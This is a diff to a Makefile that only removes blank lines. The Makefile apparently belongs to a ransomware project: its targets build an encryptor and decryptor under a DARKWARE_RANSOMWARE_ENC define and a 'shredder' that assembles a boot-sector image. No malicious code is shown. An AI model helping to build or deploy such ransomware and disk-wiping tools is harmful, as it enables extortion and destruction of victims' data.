@@ -4,13 +4,11 @@ HEADERS  := crypt/cryptspace.hpp crypt/md5.hpp crypt/AES256.hpp crypt/AES256_PRN
 CXXFLAGS := -O3 -ggdb -Wall -Wextra
 SHREDDER := shred/shredder.hpp shred/shredder.cpp
 DISBL    := -Wno-deprecated
-
 all: shredder darkwarenc darkwardec
 
 shredder:
 	nasm -f bin shred/boot.asm -o msg.img
 	$(CXX) $(CXXFLAGS) -DSHREDDER main.cpp $(SHREDDER) -o $@
-
 darkwarenc: $(SOURCES) $(HEADERS)
 	$(CXX) $(CXXFLAGS) $(DISBL) -DDARKWARE_RANSOMWARE_ENC -o $@ main.cpp $(SOURCES)
 darkwardec: $(SOURCES) $(HEADERS)
